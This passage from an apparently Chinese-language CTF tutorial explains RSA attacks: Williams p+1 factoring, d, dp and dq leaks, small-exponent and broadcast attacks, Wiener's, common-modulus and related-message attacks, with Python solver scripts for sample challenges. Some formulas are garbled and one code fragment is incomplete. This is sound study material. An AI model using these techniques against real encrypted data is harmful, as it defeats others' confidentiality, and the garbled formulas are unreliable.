-\beta^n)/(\alpha - \beta)\\ V_n(P, Q) &amp;= \alpha^n + \beta^n
\end{aligned}\]</span> 同样有 <span class="math inline">\(\Delta =
(\alpha - \beta)^2 = P^2-4Q\)</span>，则有 <span
class="math display">\[\begin{cases} U_{n+1} &amp;= PU_n - QU_{n-1}\\
V_{n+1} &amp;= PV_n - QV_{n-1} \end{cases}\tag{2.2}\]</span> <span
class="math display">\[\begin{cases} U_{2n} &amp;= V_nU_n\\ V_{2n}
&amp;= V_n^2 - 2Q^n \end{cases}\tag{2.3}\]</span> <span
class="math display">\[\begin{cases} U_{2n-1} &amp;= U_n^2 -
QU_{n-1}^2\\ V_{2n-1} &amp;= V_nV_{n-1} - PQ^{n-1}
\end{cases}\tag{2.4}\]</span> <span class="math display">\[\begin{cases}
\Delta U_{n} &amp;= PV_n - 2QV_{n-1}\\ V_{n} &amp;= PU_n - 2QU_{n-1}
\end{cases}\tag{2.5}\]</span> <span class="math display">\[\begin{cases}
U_{m+n} &amp;= U_mU_{n+1} - QU_{m-1}U_n\\ \Delta U_{m+n} &amp;=
V_mV_{n+1} - QV_{m-1}V_n \end{cases}\tag{2.6}\]</span> <span
class="math display">\[\begin{cases} U_{n}(V_k(P, Q), Q^k) &amp;=
U_{nk}(P, Q)/U_k(P, Q)\\ V_{n}(V_k(P, Q), Q^k) &amp;= V_n(P, Q)
\end{cases}\tag{2.7}\]</span></p></li>
</ul>
<p>同时我们有如果 <span class="math inline">\((N, Q) =
1\)</span> 且 <span class="math inline">\(P^{&#39;}Q\equiv
P^2-2Q\pmod{N}\)</span>，则有 <span
class="math inline">\(P^{&#39;}\equiv \alpha/\beta +
\beta/\alpha\)</span> 以及 <span class="math inline">\(Q^{&#39;}\equiv
\alpha/\beta + \beta/\alpha = 1\)</span>，即 <span
class="math display">\[U_{2m}(P, Q)\equiv PQ^{m-1}U_m(P^{&#39;},
1)\pmod{N}\tag{2.8}\]</span></p>
<p>根据扩展卢卡斯定理，如果 <span class="math inline">\(p\)</span>
是奇素数，<span class="math inline">\(p\nmid
Q\)</span> 且勒让德符号<span class="math inline">\((\Delta/p) =
\epsilon\)</span>，则 <span class="math display">\[\begin{aligned}
U_{(p-\epsilon)m}(P, Q) &amp;\equiv 0\pmod{p}\\ V_{(p-\epsilon)m}(P, Q)
&amp;\equiv 2Q^{m(1-\epsilon)/2}\pmod{p} \end{aligned}\]</span></p>
<ul>
<li><p><code>第一种情况</code>：已知 <span
class="math inline">\(N\)</span> 的因数 <span
class="math inline">\(p\)</span>，且 <span
class="math inline">\(p+1\)</span> 是一个光滑数 <span
class="math display">\[p =
\left(\prod_{i=1}^k{q_i^{\alpha_i}}\right)-1\]</span></p>
<p>有 <span class="math inline">\(p+1\mid R\)</span>，当 <span
class="math inline">\((Q, N)=1\)</span> 且 <span
class="math inline">\((\Delta/p) = -1\)</span> 时有 <span
class="math inline">\(p\mid U_R(P, Q)\)</span>，即 <span
class="math inline">\(p\mid (U_R(P, Q), N)\)</span></p>
<p>为了找到 U_R(P,
Q)，<code>Guy</code>和<code>Conway</code>提出可以使用如下公式 <span
class="math display">\[\begin{aligned} U_{2n-1} &amp;= U_n^2 - QU_n^2 -
1\\ U_{2n} &amp;= U_n(PU_n - 2QU_{n-1})\\ U_{2n+1} &amp;= PU_{2n} -
QU_{2n-1} \end{aligned}\]</span></p>
<p>但是上述公式值太大了，不便运算，我们可以考虑如下方法</p>
<p>如果 <span class="math inline">\(p \mid U_R(P, 1)\)</span>，根据
<code>公式2.3</code> 有 <span class="math inline">\(p\mid U_{2R}(P,
Q)\)</span>，所以根据 <code>公式2.8</code> 有 <span
class="math inline">\(p \mid U_R(P^{&#39;}, 1)\)</span>，设 <span
class="math inline">\(Q=1\)</span>，则有 <span
class="math display">\[V_{(p-\epsilon)m}(P, 1) \equiv 2\pmod{p}\]</span>
即，如果$ pU_R(P, 1)<span class="math inline">\(，则 \)</span>p(V_R(P,
1) -2)$。</p>
<p>第一种情况可以归纳为：</p>
<p>让 <span class="math inline">\(R = r_1r_2r_3\cdots
r_m\)</span>，同时找到 <span
class="math inline">\(P_0\)</span> 使得 <span
class="math inline">\((P_0^2-4, N) = 1\)</span>，定义 <span
class="math inline">\(V_n(P) = V_n(P, 1), U_n(P) = U_n(P, 1)\)</span> 且
<span class="math display">\[P_j \equiv V_{r_j}(P_{j-1})\pmod{N}(j =
1,2,3,\dots,m)\]</span> 根据<code>公式2.7</code>，有 <span
class="math display">\[P_m \equiv V_R(P_0)\pmod{N}\tag{3.1}\]</span></p>
<p>要计算 <span class="math inline">\(V_r =
V_r(P)\)</span> 可以用如下公式</p>
<p>根据 <code>公式2.2</code>，<code>公式2.3</code>，<code>公式2.4</code>
有 <span class="math display">\[\begin{cases} V_{2f-1}&amp;\equiv
V_fV_{f-1}-P\\ V_{2f}&amp;\equiv V_f^2 - 2\\ V_{2f+1}&amp;\equiv
PV_f^2-V_fV_{f-1}-P\pmod(N) \end{cases}\]</span> 令 <span
class="math display">\[r = \sum_{i=0}^t{b_t2^{t-i}}\ \ \ \
(b_i=0,1)\]</span> <span class="math inline">\(f_0=1,
f_{k+1}=2f_k+b_{k+1}\)</span>，则 <span
class="math inline">\(f_t=r\)</span>，同样 <span
class="math inline">\(V_0(P) = 2, V_1(P) = P\)</span>，则最终公式为
<span class="math display">\[(V_{f_{k+1}}, V_{f_{k+1}-1}) =
\begin{cases} (V_{2f_k}, V_{2f_k-1})\ \ \ \ if\ b_{k+1}=0\\ (V_{2f_k+1},
V_{2f_k})\ \ \ \ if\ b_{k+1}=1 \end{cases}\]</span></p></li>
<li><p><code>第二种情况</code>：已知 <span
class="math inline">\(p+1\)</span> 是一个光滑数 <span
class="math display">\[p =
s\left(\prod_{i=1}^k{q_i^{\alpha_i}}\right)-1\]</span></p>
<p>当 <span class="math inline">\(s\)</span> 是素数，且 <span
class="math inline">\(B_1&lt;s\le B_2\)</span>，有 <span
class="math inline">\(p\mid(a_m^s-1, N)\)</span>，定义 <span
class="math inline">\(s_j\)</span> 和 <span
class="math inline">\(2d_j\)</span> <span class="math display">\[2d_j =
s_j+1-s_j\]</span> 如果 <span class="math inline">\((\Delta/p) =
-1\)</span> 且 <span class="math inline">\(p\nmid P_m-2\)</span>，则根据
<code>公式2.7</code> 和 <code>公式3.1</code> 有 <span
class="math inline">\(p\mid(U_s(P_m), N)\)</span>。</p>
<p>令 <span class="math inline">\(U[n] \equiv U_n(P_m), V[n]\equiv
V_n(P_m)\pmod{N}\)</span>，计算 <span class="math inline">\(U[2d_j-1],
U[2d_j], U[2d_j+1]\)</span></p>
<p>通过 <span class="math display">\[U[0] = 0, U[1] = 1, U[n+1] =
P_mU[n] - U[n-1]\]</span> 计算 <span class="math display">\[T[s_i]
\equiv \Delta U_{s_i}(P_m) = \Delta
U_{s_iR}(P_0)/U_R(P_0)\pmod{N}\]</span> 通过
<code>公式2.6</code>，<code>公式2.7</code> 和 <code>公式3.1</code> 有
<span class="math display">\[\begin{cases} T[s_1]&amp;\equiv
P_mV[s_1]-2V[s_1-1]\\ T[s_1-1]&amp;\equiv 2V[s_1]-P_mV[s_1-1]\pmod{N}
\end{cases}\]</span> 即 <span class="math display">\[\begin{cases}
T[s_{i+1}]&amp;\equiv T[s_i]U[2d_i+1]-T[s_i-1]U[2d_i]\\
T[s_{i+1}-1]&amp;\equiv T[s_i]U[2d_i]-T[s_i-1]U[2d_i-1]\pmod{N}
\end{cases}\]</span> 计算 <span class="math inline">\(T[s_i],
i=1,2,3\dots\)</span>，然后计算 <span class="math display">\[H_t =
(\prod_{i=0}^c{T[s_{i+t}], N})\]</span> 其中 <span
class="math inline">\(t = 1, c+1, 2c+1, \dots,
c[B_2/c]+1\)</span>，我们有 <span class="math inline">\(p\mid
H_i\)</span> 当 <span
class="math inline">\((\Delta/p)=-1\)</span></p></li>
<li><p>python 代码实现</p></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mlucas</span>(<span class="params">v, a, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Helper function for williams_pp1().  Multiplies along a Lucas sequence modulo n. &quot;&quot;&quot;</span></span><br><span class="line">    v1, v2 = v, (v**<span class="number">2</span> - <span class="number">2</span>) % n</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">bin</span>(a)[<span class="number">3</span>:]: v1, v2 = ((v1**<span class="number">2</span> - <span class="number">2</span>) % n, (v1*v2 - v) % n) <span class="keyword">if</span> bit == <span class="string">&quot;0&quot;</span> <span class="keyword">else</span> ((v1*v2 - v) % n, (v2**<span class="number">2</span> - <span class="number">2</span>) % n)</span><br><span class="line">    <span class="keyword">return</span> v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> count(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> primegen():</span><br><span class="line">        e = ilog(isqrt(n), p)</span><br><span class="line">        <span class="keyword">if</span> e == <span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(e): v = mlucas(v, p, n)</span><br><span class="line">        g = gcd(v-<span class="number">2</span>, n)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt; g &lt; n: <span class="keyword">return</span> g <span class="comment"># g|n</span></span><br><span class="line">        <span class="keyword">if</span> g == n: <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="d-泄露攻击">3.4. d 泄露攻击</h3>
<p><strong>攻击原理</strong> </p>
<p>首先当 <span class="math inline">\(d\)</span>
泄露之后，我们自然可以解密所有加密的消息。我们甚至还可以对模数 <span
class="math inline">\(N\)</span> 进行分解。其基本原理如下</p>
<p>我们知道 <span class="math inline">\(ed≡1 \bmod
φ(n)\)</span>，那么存在一个 <span class="math inline">\(k\)</span> 使得
<span class="math inline">\(ed−1=kφ(n)\)</span></p>
<p>又 <span class="math inline">\(∀a∈Z^∗_n\)</span>，满足 <span
class="math inline">\(a^{ed−1}≡1 \pmod n)\)</span>。令 <span
class="math display">\[ed−1=2^st\]</span></p>
<p>其中，<span
class="math inline">\(t\)</span> 是一个奇数。然后可以证明对于至少一半的 <span
class="math inline">\(a∈Z^∗_n\)</span>，存在一个 <span
class="math inline">\(i∈[1,s]\)</span>，使得</p>
<p><span class="math display">\[a^{2^{i−1}}t≢±1 \pmod n,a^{2^i}t≡1 \pmod
n\]</span></p>
<p>成立。如果 <span class="math inline">\(a,i\)</span>
满足上述条件，<span class="math inline">\(gcd(a^{2^{i−1}}t−1,n)\)</span>
是 <span
class="math inline">\(n\)</span> 的一个非平凡因子，所以可以对 <span
class="math inline">\(n\)</span> 进行暴力分解。</p>
<h3 id="dpdq-泄露">3.5. dp、dq 泄露</h3>
<p><strong>攻击条件：</strong></p>
<p>已知p，q，dp，dq，c</p>
<p><strong>关系公式：</strong></p>
<p><span class="math display">\[\left\{ \begin{array}{ll} dp≡d \bmod
(p−1) \\ dq≡d \bmod(q−1) \end{array} \right. \]</span></p>
<p><strong>解密：</strong></p>
<p><span class="math display">\[m_1=c^{dp}\bmod p\]</span></p>
<p><span class="math display">\[m_2=c^{dq} \bmod q\]</span></p>
<p><span
class="math display">\[m=(((m_1−m_2)∗I)\bmod p)∗q+m_2\]</span></p>
<p><span class="math display">\[I:乘法逆元，I=invert(q,p)\]</span></p>
<p><strong>原理</strong></p>
<p>利用中国剩余定理和欧拉定理可得：<span class="math inline">\(m_1≡c^d
\bmod p，m_2≡c^d \bmod q\)</span></p>
<p><strong>证明：</strong></p>
<p>由 <span class="math inline">\(m≡c^d \bmod n\)</span>, 得 <span
class="math inline">\(m=c^d+k∗n\)</span></p>
<p>因为 <span class="math inline">\(n=p∗q\)</span> , 所以 <span
class="math inline">\(m=c^d+k∗p∗q\)</span></p>
<p>上述公式中，同时取余p和q，可分别得到： <span
class="math inline">\(m_1≡c^d \bmod p，m_2≡c^d \bmod q\)</span></p>
<p>所以 <span class="math inline">\(c^d=m_1+k∗p\)</span>，代入 <span
class="math inline">\(m_2≡c^d \bmod q\)</span> 可得：<span
class="math inline">\(m_2≡(m_1+k∗p) \bmod q\)</span></p>
<p>等式两边同时减去 <span
class="math inline">\(m_1\)</span>，可以得到：<span
class="math inline">\((m_2−m_1)≡(k∗p) \bmod q\)</span></p>
<p>这里因为gcd(p,q)=1 ,所以可以得到p的逆元，得：<span
class="math inline">\((m_2−m_1)∗p^{−1}≡k \bmod q\)</span> </p>
<p>即：<span class="math inline">\(k≡(m_2−m_1)∗p^{−1}
\bmod q\)</span> ，所以：</p>
<p><span class="math display">\[\begin{array}{l}  \left \{
\begin{array}{l} k≡(m_2−m_1)∗p^{−1} \bmod q \\ c^d=k∗p+m_1  \\  m≡c^d
\bmod n  \end{array} \right. \\ \\ \Rightarrow   c^d=((m_2−m_1)∗p^{−1}
\bmod q)∗p+m_1  \\ \\ \Rightarrow m=(((m_2−m_1)∗p^{−1} \bmod q)∗p+m_1)
\bmod n \end{array}\]</span></p>
<p><strong>示例【BUURSA1】</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"><span class="comment">#n=p*q</span></span><br><span class="line"></span><br><span class="line">I = invert(q,p)            <span class="comment">#求p的逆元</span></span><br><span class="line">mp = <span class="built_in">pow</span>(c,dp,p)           <span class="comment">#求幂取模运算</span></span><br><span class="line">mq = <span class="built_in">pow</span>(c,dq,q)           <span class="comment">#求幂取模运算</span></span><br><span class="line"></span><br><span class="line">m = (((mp-mq)*I)%p)*q+mq   <span class="comment">#求明文公式</span></span><br><span class="line"><span class="comment">#m = m%n(可以加上，不加也没事，这里数值不大)</span></span><br><span class="line"><span class="built_in">print</span>(n2s(m))              <span class="comment">#n2s()函数，用于数值转字符串</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="dp-泄露">3.6. dp 泄露</h3>
<p><strong>攻击条件：</strong></p>
<p>已知e，n，dp，c</p>
<p><strong>关系公式：</strong></p>
<p><span class="math display">\[\begin{array}{ll} dp≡d \bmod (p-1) \\ \\
φ(n)=(p−1)∗(q−1) \\ \\ d∗e≡1 \bmod φ(n) \\ \\ m≡c^d \bmod n
\end{array}\]</span></p>
<p><strong>原理：</strong></p>
<p><span class="math display">\[\begin{array}{l}dp∗e≡d∗e
\bmod (p−1)  \\  \\ \Rightarrow ed=k_2(p−1)+dp∗e (k_2为整数) \\ \\
\Rightarrow  由\quad e∗d≡1 \bmod (p−1)(q−1) \quad 得
\quad ed=k_1(q−1)(p−1)+1 \\ \\ \Rightarrow
k_1(q−1)(p−1)+1=k_2(p−1)+dp∗e  \\ \\
\Rightarrow  (p−1)(k_1(q−1)−k_2)+1=dp∗e \end{array} \]</span></p>
<p>令：<span class="math inline">\(x=(k_1(q−1)−k_2)\)</span>，即： <span
class="math display">\[(p−1)x+1=dp∗e\]</span></p>
<p>因为 <span class="math inline">\(dp&lt;(p−1)\)</span>，所以 <span
class="math inline">\(e&gt;x\)</span>，所以 <span
class="math inline">\(x∈(1,e)\)</span></p>
<p>遍历 <span class="math inline">\(x\)</span>
即可求出p，接着求出q，进而求得φ(n)，最后得到 d 。</p>
<p><strong>例题【BUURSA2】</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):  <span class="comment"># 在范围(1,e)之间进行遍历</span></span><br><span class="line">    <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>) == <span class="number">0</span>:  <span class="comment"># 存在p，使得n能被p整除</span></span><br><span class="line">            p = ((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span></span><br><span class="line">            q = n // (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>)</span><br><span class="line">            phi = (q - <span class="number">1</span>) * (p - <span class="number">1</span>)  <span class="comment"># 欧拉定理</span></span><br><span class="line">            d = invert(e, phi)  <span class="comment"># 求模逆</span></span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)  <span class="comment"># 快速求幂取模运算</span></span><br><span class="line">            <span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)))    <span class="comment"># 16进制转文本</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="小指数明文爆破">3.7. 小指数明文爆破</h3>
<p>如果使用的 e 太小了，比如 e = 3，且要传递的明文也很小，
比如就几个字节，那么 <span class="math inline">\(c\ =\ m^e\ mod\
n\)</span>，e=3，m 很小，n 很大，所以可能发生 <span
class="math inline">\(m^e &lt; n\)</span>，那么此时<span
class="math inline">\(c=m^3\)</span>，直接对 c 开三次方根即可得到
m。当然这是一 种极端的情况。如果 <span class="math inline">\(m^3 &gt;
n\)</span> 但是没有超过太多，即 <span class="math inline">\(k ∗ n &lt;
m^3 &lt; (k + 1)∗ n\)</span>， 且 k 是可以爆破大小的，则可以通过关系式
<span class="math inline">\(k*n+c=m^3\)</span> 来爆破明文。</p>
<h3 id="wiener-attack低解密指数攻击-和-boneh-durfee-attack">3.8. Wiener
Attack【低解密指数攻击】 和 Boneh Durfee Attack</h3>
<p><strong>攻击条件：</strong></p>
<p>在 <span class="math inline">\(d\)</span> 比较小（<span
class="math inline">\(d&lt;\frac{1}{3}N^ \frac
{1}{4}\)</span>）时，攻击者可以使用 <strong>Wiener's
Attack</strong> 来获得私钥。</p>
<p><strong>原理：</strong></p>
<blockquote>
<ol type="1">
<li><a href="https://en.wikipedia.org/wiki/Wiener%27s_attack">Wiener's
attack - Wikipedia</a></li>
<li><a
href="https://sagi.io/2016/04/crypto-classics-wieners-rsa-attack/">Crypto
Classics: Wiener's RSA Attack</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/400818185">Wiener's Attack
Ride(维纳攻击法驾驭) - 知乎</a></li>
<li><a
href="https://blog.csdn.net/XiongSiqi_blog/article/details/130515028">RSA--维纳攻击--代码和题目分析_rsa维纳攻击_Emmaaaaaaaaaa的博客-CSDN博客</a></li>
</ol>
</blockquote>
<p><strong>概述</strong></p>
<p><a
href="https://www.tr0y.wang/2017/11/06/CTFRSA/#coppersmith-%E5%AE%9A%E7%90%86%E6%94%BB%E5%87%BB">低解密指数攻击</a></p>
<p><span class="math inline">\(N = pq\)</span></p>
<p><span class="math inline">\(\varphi(n) = (p-1)(q-1)=pq - (p + q) +
1=N - (p + q) + 1\)</span></p>
<p><span class="math inline">\(\because p, q\)</span> 非常大，<span
class="math inline">\(\therefore\ pq\gg p+q，\therefore\varphi(n)\approx
N\)</span></p>
<p><span class="math inline">\(\because ed\equiv1\ mod\
\varphi(n)，\therefore ed-1=k\varphi(n)\)</span>，这个式子两边同除 <span
class="math inline">\(d\varphi(n)\)</span> 可得：</p>
<p><span
class="math display">\[\frac{e}{\varphi(n)}-\frac{k}{d}=\frac{1}{d\varphi(n)}\]</span></p>
<p><span class="math inline">\(\because\varphi(n)\approx
N，\therefore\frac{e}{N}-\frac{k}{d}=\frac{1}{d\varphi(n)}\)</span>，同样 <span
class="math inline">\(d\varphi(n)\)</span> 是一个很大的数，所以 <span
class="math inline">\(\frac{e}{N}\)</span> 略大于 <span
class="math inline">\(\frac{k}{d}\)</span></p>
<p>因为 <span class="math inline">\(e\)</span> 和 <span
class="math inline">\(N\)</span> 是我们是知道的，所以我们计算出 <span
class="math inline">\(\frac{e}{N}\)</span> 后，比它略小的 <span
class="math inline">\(\frac{k}{d}\)</span> 怎么出来呢，计算 <span
class="math inline">\(\frac{e}{N}\)</span> 的连分数展开，依次算出这个分数每一个渐进分数，由于 <span
class="math inline">\(\frac{e}{N}\)</span> 略大于 <span
class="math inline">\(\frac{k}{d}\)</span>，wiener
证明了，该攻击能精确的覆盖 <span
class="math inline">\(\frac{k}{d}\)</span>（论文刚不动，只知道结论）</p>
<p>通过对 <span class="math inline">\(\frac {e}{N}\)</span>
的连分数展开得到 <span class="math inline">\(k,d\)</span> ,
代入上面的 <span
class="math inline">\(ed-1=k\varphi(n)\)</span> 中，得到 <span
class="math inline">\(\varphi(n)\)</span> ，利用 <span
class="math inline">\(\varphi(n) = pq - (p + q) + 1 = N - (p + q) +
1\)</span> 和 <span class="math inline">\(N = pq\)</span> ，算出 <span
class="math inline">\((p + q)=N- \varphi(n)+1\)</span> ，已知 <span
class="math inline">\(pq\)</span> ,和 <span
class="math inline">\(p+q\)</span>
的值，进一步利用韦达定理构造出方程 <span class="math inline">\(x^2 - (p
+ q) * x + pq = 0\)</span>, 解方程求<span
class="math inline">\(p,q\)</span></p>
<p><strong>攻击脚本：</strong></p>
<p><a href="https://github.com/pablocelayes/rsa-wiener-attack">GitHub -
pablocelayes/rsa-wiener-attack: A Python implementation of the Wiener
attack on RSA public-key encryption scheme.</a></p>
<h3 id="低加密指数广播攻击">3.9. 低加密指数广播攻击</h3>
<p><strong>攻击条件：</strong></p>
<p>e很小，并且使用了相同的加密指数e给若干个接收者发送相同的信息</p>
<p><strong>原理：</strong></p>
<p>Bob不仅多次选择的加密指数低（例如3或其它较小的素数），而且这几次加密过程，加密的信息都是相同的，那么由：</p>
<p><span class="math display">\[c_1 ≡ m^e mod n_1\]</span></p>
<p><span class="math display">\[c_2 ≡ m^e mod n_2\]</span></p>
<p><span class="math display">\[c_3 ≡ m^e mod n_3\]</span></p>
<p>那么通过中国剩余定理，可以计算出一个数 <span
class="math inline">\(c_x\)</span> 为： <span class="math display">\[c_x
≡ m^3 mod n_1n_2n_3\]</span> 然后对 <span
class="math inline">\(c_x\)</span> 开三次方即可得到m。</p>
<p><strong>例题【<a
href="https://cryptohack.org/challenges/rsa/">Endless
Emails</a>】</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 核心代码</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">broadcast_attack</span>(<span class="params">data</span>): <span class="comment"># data = [(c[i], n[i]), (c[j], n[j]), (c[k], n[k])]</span></span><br><span class="line">    <span class="comment"># 乘法逆元和最大公因数  </span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):  </span><br><span class="line">        x, y = <span class="number">0</span>, <span class="number">1</span>  </span><br><span class="line">        lastx, lasty = <span class="number">1</span>, <span class="number">0</span>  </span><br><span class="line">        <span class="keyword">while</span> b:  </span><br><span class="line">            a, (q, b) = b, <span class="built_in">divmod</span>(a, b)  </span><br><span class="line">            x, lastx = lastx - q * x, x  </span><br><span class="line">            y, lasty = lasty - q * y, y  </span><br><span class="line">        <span class="keyword">return</span> (lastx, lasty, a)  </span><br><span class="line">    <span class="comment"># 一次同余方程组求解  </span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">chinese_remainder_theorem</span>(<span class="params">items</span>):  </span><br><span class="line">        N = <span class="number">1</span>  </span><br><span class="line">        <span class="keyword">for</span> a, n <span class="keyword">in</span> items:  </span><br><span class="line">            N *= n  </span><br><span class="line">        result = <span class="number">0</span>  </span><br><span class="line">        <span class="keyword">for</span> a, n <span class="keyword">in</span> items:  </span><br><span class="line">            m = N // n  </span><br><span class="line">            r, s, d = extended_gcd(n, m)  </span><br><span class="line">            <span class="keyword">if</span> d != <span class="number">1</span>:  </span><br><span class="line">                N = N // n  </span><br><span class="line">                <span class="keyword">continue</span>  </span><br><span class="line">            result += a * s * m  </span><br><span class="line">        <span class="keyword">return</span> result % N  </span><br><span class="line">  </span><br><span class="line">    x = chinese_remainder_theorem(data)  </span><br><span class="line">    m = iroot(x, <span class="number">3</span>)[<span class="number">0</span>]  <span class="comment"># iroot(27,3) : (mpz(3), True)  </span></span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
<h3 id="共模攻击">3.10. 共模攻击</h3>
<p><strong>原理：</strong></p>
<p>当n一定时，已知 <span
class="math inline">\(e_1,e_2,c_1,c_2\)</span>，若 <span
class="math inline">\(gcd(e_1,e_2) = 1\)</span> ，则有 <span
class="math inline">\(e_1s_1+e_2s_2 = 1\)</span>(其中<span
class="math inline">\(s_1,s_2\)</span>
为整数，且一正一负)，通过扩展欧几里得算法，可得上式的一组解 <span
class="math inline">\((s_1,s_2)\)</span> ，假设<span
class="math inline">\(s_1\)</span>为正，<span
class="math inline">\(s_2\)</span>为负，因为<span
class="math inline">\(c_1 \equiv m^{e_1}\bmod{n}\)</span>，<span
class="math inline">\(c2\equiv m^{e_2}\bmod{n}\)</span>，所以：</p>
<p><span
class="math display">\[\begin{array}{l}(c_1^{s_1}c_2^{s_2})\bmod{n}
\\  =((m^{e_1}\bmod{n})^{s_1}*(m^{e_2}\bmod{n})^{s_2})\bmod{n} \\
=((m^{e_1s_1+e_2s_2})\bmod{n})\bmod{n} \\ =m\bmod{n}
\end{array}\]</span></p>
<p>即：</p>
<p><span
class="math display">\[m=(c_1^{s_1}c_2^{s_2})\bmod{n}\]</span></p>
<p><strong>例题【XCTF：best_RSA】</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">1306</span>…………04961</span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">e1 = <span class="number">117</span></span><br><span class="line">s = gcdext(e1, e2)</span><br><span class="line">c1=bytes_to_long(<span class="built_in">open</span>(<span class="string">&#x27;./cipher1.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">c2=bytes_to_long(<span class="built_in">open</span>(<span class="string">&#x27;./cipher2.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">m = <span class="built_in">pow</span>(c1, s[<span class="number">1</span>], n) * <span class="built_in">pow</span>(c2, s[<span class="number">2</span>], n) % n  <span class="comment"># 获取明文m</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br></pre></td></tr></table></figure>
<h3 id="related-message-attack">3.11. Related Message Attack <a
href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/#related-message-attack"
title="Permanent link">¶</a></h3>
<h4 id="攻击条件-1">3.11.1. 攻击条件</h4>
<p>当 Alice 使用同一公钥对两个具有某种线性关系的消息 M1 与 M2
进行加密，并将加密后的消息 C1，C2 发送给了 Bob
时，我们就可能可以获得对应的消息 M1 与 M2。这里我们假设模数为
N，两者之间的线性关系如下</p>
<p><span class="math display">\[M_1 \equiv f(M_2) \bmod N\]</span></p>
<p>其中 f 为一个线性函数，比如说 <span
class="math inline">\(f=ax+b\)</span>。</p>
<p>在具有较小错误概率下的情况下，其复杂度为 <span
class="math inline">\(O(elog^2N)\)</span>。</p>
<p>这一攻击由 Franklin，Reiter 提出。</p>
<h4 id="攻击原理">3.11.2. 攻击原理</h4>
<p>首先，我们知道 <span class="math inline">\(C_1 \equiv M_1 ^e \bmod
N\)</span>，并且 <span class="math inline">\(M_1 \equiv f(M_2) \bmod
N\)</span>，那么我们可以知道 <span
class="math inline">\(M_2\)</span> 是 <span class="math inline">\(f(x)^e
\equiv C_1 \bmod N\)</span> 的一个解，即它是方程 <span
class="math inline">\(f(x)^e-C_1\)</span> 在模 <span
class="math inline">\(N\)</span> 意义下的一个根。同样的，<span
class="math inline">\(M_2\)</span> 是 <span class="math inline">\(x^e -
C_2\)</span> 在模 <span class="math inline">\(N\)</span>
意义下的一个根。所以说 <span
